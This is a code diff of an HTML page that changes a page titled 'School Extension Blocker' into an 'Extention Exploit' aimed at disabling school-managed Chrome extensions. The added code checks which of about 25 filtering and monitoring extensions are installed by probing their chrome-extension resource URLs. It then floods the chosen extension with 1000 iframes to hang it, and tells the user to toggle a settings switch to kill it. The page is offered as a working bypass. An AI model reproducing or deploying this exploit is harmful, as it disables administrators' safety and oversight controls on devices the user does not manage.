@@ -1,13 +1,12 @@
-<!DOCTYPE html>
+data:text/html;charset=utf-8,<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>School Extension Blocker</title>
+  <title>Extention Exploit</title>
   <link rel="shortcut icon" type="image/png" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/main/favicon.png">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
   <style>
-    /* CSS Styles */
     body {
       font-family: 'Varela Round', sans-serif;
       margin: 0;
@@ -92,7 +91,7 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    #blockExtensionText {
+    #killExtensionText {
       display: none;
       margin-top: 20px;
       color: #333;
@@ -103,21 +102,21 @@
       border-radius: 8px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
     }
-    #blockButton {
-      display: none;
-      background-color: #dc3545;
-      color: #fff;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      border-radius: 5px;
-      transition: background-color 0.3s ease;
-    }
+   	 #killButton {
+	  display: none;
+	  background-color: #dc3545;
+	  color: #fff;
+	  border: none;
+	  padding: 10px 20px;
+	  font-size: 16px;
+	  cursor: pointer;
+	  border-radius: 5px;
+ 	  transition: background-color 0.3s ease;
+	}
 
-    #blockButton:hover {
-      background-color: #9c1c28;
-    }
+	#killButton:hover {
+	  background-color: #9c1c28;
+	}
     footer {
       background-color: #343a40;
       color: #fff;
@@ -140,34 +139,37 @@
 
 <header>
   <img src="https://blobby-boi.github.io/BlobbypassXSS/favicon.png" alt="Logo" class="logo">
-  <h1>Super School Tools - Extension Blocker</h1>
+  <h1>Super School Tools - Extention Remover</h1>
 </header>
 
 <div class="container">
-  <p>Super School Tools: Block Chrome extensions that may interfere with the educational environment.</p>
-  <label for="iframeSelect" id="labelForIframeSelect">Select an extension to block:</label>
+  <p>Extention Remover is an exploit that allows Chrome users to remove supported extentions managed by their school. It currently works on all new ChromeOS versions as of November 2024.</p>
+  <label for="iframeSelect" id="labelForIframeSelect">Extention Selection:</label>
   <select id="iframeSelect">
   </select>
-  <button onclick="warning();" id="hangButton">Block Extension!</button>
-  <button id="blockButton" onclick="openExtensionPopup();">Finalize Blocking!</button>
+  <button onclick="warning();" id="hangButton">Remove Extension!</button>
+  <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
 </div>
 
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
-  Blocking... (This will take about 1 minute)
+  Hanging... (This will take about 1 minute)
 </div>
-<div id="blockExtensionText"></div>
+<div id="killExtensionText"></div>
 
 <footer>
-  <p>Made by <a href="https://github.com/Blobby-Boi/">Super School Tools</a></p>
+  <p>Made by <a href="https://super-school-schools.github.io/Home/">Super School Tools</a></p>
 </footer>
 
 <script>
-  /* JavaScript */
   async function checkExtensionURL(url) {
     try {
       const response = await fetch(url);
-      return response.ok;
+      if (response.ok) {
+        return true;
+      } else {
+        return false;
+      }
     } catch (error) {
       return false;
     }
@@ -177,10 +179,33 @@
     const selectElement = document.getElementById("iframeSelect");
     const extensions = {
       "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+      "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
       "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
       "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
       "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+      "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+      "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+      "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/images/digital-insight(128x128).png",
+      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
+      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
+      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
     };
+    
     let hasSupportedExtensions = false;
 
     for (const [name, url] of Object.entries(extensions)) {
@@ -192,7 +217,7 @@
         hasSupportedExtensions = true;
       }
     }
-
+    
     if (!hasSupportedExtensions) {
       const option = document.createElement("option");
       option.value = "";
@@ -203,7 +228,7 @@
   }
 
   populateSelectOptions();
-
+  
   function replaceIframes(container, iframeSrc) {
     for (var i = 0; i < 1000; i++) {
       var iframe = document.createElement('iframe');
@@ -236,22 +261,28 @@
     setTimeout(function() {
       popup.close();
       var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
-      var blockExtensionText = document.getElementById("blockExtensionText");
-      blockExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been prepared, press the button above.";
+      var extensionURL = "chrome-extension://" + extensionId;
+      var killExtensionText = document.getElementById("killExtensionText");
+      killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
       setTimeout(function() {
         overlay.style.display = "none";
-        blockExtensionText.style.display = "block";
-        document.getElementById("blockButton").style.display = "inline-block";
+        killExtensionText.style.display = "block";
+        document.getElementById("killButton").style.display = "inline-block";
         document.getElementById("hangButton").style.display = "none";
-        document.getElementById("iframeSelect").style.display = "none";
-        document.getElementById("labelForIframeSelect").style.display = "none";
-      }, 1000);
-    }, 60000);
+	document.getElementById("iframeSelect").style.display = "none";
+	document.getElementById("labelForIframeSelect").style.display = "none";
+        document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+      }, 10000);
+    }, 5000);
   }
 
   function openExtensionPopup() {
-    var popupWindow = window.open("", "_blank", "width=800,height=600");
-    popupWindow.document.body.innerHTML = "<h1>Extension is being blocked!</h1>";
+    var selectedSrc = document.getElementById("killButton").getAttribute("data-url");
+    var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+    var killExtensionText = document.getElementById("killExtensionText");
+    document.getElementById("killButton").style.display = "none";
+    killExtensionText.innerHTML = "Make sure to keep this tab open. Then in a new tab open <strong>chrome://extensions/?id=" + extensionId + "</strong> Flip the switch called allow access to file URLs twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
+    window.location.href = selectedSrc;
   }
 </script>
 </body>
